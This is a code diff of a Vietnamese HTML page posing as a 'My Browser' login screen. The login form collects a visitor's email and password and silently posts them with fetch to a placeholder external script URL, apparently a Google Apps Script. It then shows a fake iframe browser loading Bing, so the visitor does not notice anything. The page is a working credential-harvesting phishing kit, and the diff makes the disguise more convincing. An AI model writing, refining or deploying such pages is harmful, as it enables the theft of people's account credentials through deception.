@@ -2,38 +2,62 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Trình Duyệt Siêu Cấp</title>
+    <title>Trình Duyệt Của Tôi</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 80px; background: #f4f7f6; }
-        .box { background: white; padding: 40px; border-radius: 20px; display: inline-block; shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        h1 { color: #ff4757; }
-        input { display: block; width: 280px; padding: 12px; margin: 15px auto; border: 1px solid #ddd; border-radius: 8px; }
-        button { padding: 12px 30px; background: #ff4757; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
+        /* Màn hình đăng nhập */
+        #login-page { display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
+        .card { background: white; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        
+        /* Giao diện trình duyệt sau khi đăng nhập */
+        #browser-page { display: none; flex-direction: column; height: 100vh; }
+        .toolbar { background: #333; padding: 10px; display: flex; gap: 10px; align-items: center; }
+        #url-bar { flex-grow: 1; padding: 8px; border-radius: 5px; border: none; }
+        .btn { background: #ff4757; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; }
+        iframe { width: 100%; flex-grow: 1; border: none; background: white; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>🚀 TRÌNH DUYỆT</h1>
-        <p>Đăng nhập để bắt đầu trải nghiệm</p>
-        <input type="email" id="email" placeholder="Email của bạn">
-        <input type="password" id="pass" placeholder="Mật khẩu">
-        <button onclick="saveAndGo()">ĐĂNG NHẬP & VÀO WEB</button>
+
+    <div id="login-page">
+        <div class="card">
+            <h1>🚀 MY BROWSER</h1>
+            <input type="email" id="email" placeholder="Email" style="display:block; width:250px; margin:10px auto; padding:10px;">
+            <input type="password" id="pass" placeholder="Mật khẩu" style="display:block; width:250px; margin:10px auto; padding:10px;">
+            <button class="btn" onclick="login()">ĐĂNG NHẬP</button>
+        </div>
+    </div>
+
+    <div id="browser-page">
+        <div class="toolbar">
+            <button class="btn" onclick="location.reload()">🏠</button>
+            <input type="text" id="url-bar" placeholder="Nhập địa chỉ (ví dụ: bing.com)">
+            <button class="btn" onclick="go()">ĐI</button>
+        </div>
+        <iframe id="content-frame" src="about:blank"></iframe>
     </div>
 
     <script>
-        function saveAndGo() {
+        function login() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
-            // DÁN LINK GOOGLE SCRIPT CỦA BẠN VÀO DƯỚI ĐÂY (Giữa hai dấu nháy)
             const scriptURL = 'DÁN_LINK_CỦA_BẠN_Ở_ĐÂY';
 
-            if(!email || !pass) return alert("Vui lòng điền đủ thông tin!");
+            if(!email || !pass) return alert("Nhập đủ thông tin!");
 
-            fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({email: email, password: pass})})
+            fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({email, pass})})
             .then(() => {
-                alert("Xác thực thành công! Đang mở trang chủ...");
-                window.location.href = "https://www.google.com";
+                document.getElementById('login-page').style.display = 'none';
+                document.getElementById('browser-page').style.display = 'flex';
+                // Mặc định khi vào sẽ mở Bing (vì Bing ít chặn iframe hơn Google)
+                document.getElementById('content-frame').src = "https://www.bing.com";
             });
+        }
+
+        function go() {
+            let url = document.getElementById('url-bar').value;
+            if(!url.startsWith('http')) url = 'https://' + url;
+            document.getElementById('content-frame').src = url;
         }
     </script>
 </body>
